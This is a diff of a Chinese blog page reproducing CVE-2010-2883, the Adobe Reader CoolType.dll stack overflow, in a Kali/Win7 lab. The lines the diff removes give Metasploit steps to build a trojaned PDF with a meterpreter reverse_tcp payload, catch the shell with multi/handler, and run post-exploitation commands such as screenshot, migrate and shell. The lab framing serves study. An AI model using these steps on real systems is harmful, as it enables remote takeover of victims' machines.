@@ -309,55 +309,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>#前言<br>    今天在看漏洞战争这本书的时候，看到了一个栈溢出的CVE，就想着复现一下</p>
+              <p>#前言<br>    今天在看漏洞战争这本书的时候，看到了一个栈溢出的CVE，就想着复现一下</p>
 <p>#1、漏洞复现<br>    漏洞编号：CVE-2010-2883<br>    漏洞软件：Adobe Reader,Acrobat<br>    漏洞模块：CoolType.dll<br>    漏洞类型：栈溢出 </p>
 <p>##环境准备<br>    虚拟机：kali，win7<br>    工具：MSFconsole<br>    软件：Adobe Reader-version:9.3<br><a href="https://pan.baidu.com/s/1Ik4IdnIMyAalUNcmPsjbCg" target="_blank" rel="noopener">提取码abht</a></p>
-<p>##实验流程：</p>
-<p>###1、先用Metasploit生成PDF木马<br>搜索Adobe渗透模块：</p>
-<p><code>msf&gt; search adobe_cooltype_sing</code></p>
-<p>调用渗透模块：</p>
-<p><code>msf&gt; use exploit/windows/fileformat/adobe_cooltype_sing</code></p>
-<p>查看模块信息：</p>
-<p><code>msf&gt; info</code></p>
-<p><img src="https://i.loli.net/2019/09/22/irHlkOXCB8a7VGj.png" alt="msfinfo"></p>
-<p>调用metepreter载荷，反向连接到渗透机</p>
-<p><code>msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/meterpreter/reverse_tcp</code></p>
-<p>设置kali的IP和监听端口：</p>
-<p><code>set LHOST IP</code></p>
-<p><code>set LPORT XX</code></p>
-<p>设置带有后门的PDF文件：</p>
-<p><code>set FILENAME xx.PDF</code><br>执行渗透生成文件：</p>
-<p><code>exploit</code><br><img src="https://i.loli.net/2019/09/22/WXmCHM5acxS2RUk.png" alt="msfinfo2"></p>
-<p>###2、Metasploit开启shell监听会话，等待受害机上线<br>使用handler监听模块：</p>
-<p><code>msf&gt; use exploit/multi/handler</code></p>
-<p>回弹一个TCP连接：</p>
-<p><code>msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</code></p>
-<p>设置监听的IP和端口 (和之前设置的一样):</p>
-<p><code>set LHOST IP</code></p>
-<p><code>set LPORT XX</code></p>
-<p>开始监听：</p>
-<p><code>exploit</code><br><img src="https://i.loli.net/2019/09/23/P4IbUGYiryacWeF.png" alt="msfinfo3"></p>
-<p>###3、在靶机上安装Adobe Reader_9.3软件：</p>
-<p><img src="https://i.loli.net/2019/09/23/71K4DFbwUg6CQpI.png" alt="win7"><br>ps:记得把pdf拷过来</p>
-<p>###4、打开pdf，哦吼中招</p>
-<p><img src="https://i.loli.net/2019/09/23/NYuGrVp1U2xdDnf.jpg" alt="oho"></p>
-<p>进去kali发现已经可以控制了</p>
-<p>###5、Metasploit获取shell会话，并控制靶机<br>查看当前用户：</p>
-<p><code>getuid</code></p>
-<p>查看系统信息：</p>
-<p><code>sysinfo</code></p>
-<p>截屏：</p>
-<p><code>screenshot</code></p>
-<p><img src="https://i.loli.net/2019/09/23/c4fqBJCmribRNL8.jpg" alt="screenshot"></p>
-<p>获取进程：</p>
-<p><code>ps</code></p>
-<p>切换进程（因为考虑到漏洞利用过程中，Adobe-reader会异常退出，所以速度要快）：</p>
-<p><code>migrate xx</code></p>
-<p>获取DOS shell：</p>
-<p><code>shell</code></p>
-<p><img src="https://i.loli.net/2019/09/23/y5U6TYZWfEoCz2B.png" alt="migrate"></p>
-<p><img src="https://i.loli.net/2019/09/23/DLTg5lpymvxcVnB.png" alt="shell"></p>
-
+          
       
     </div>
     
@@ -370,6 +325,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/栈溢出-CVE/">栈溢出,CVE</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2019/09/22/CVE-2010-2883-Adobe-Reader-TTF字体SING表栈溢出漏洞/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
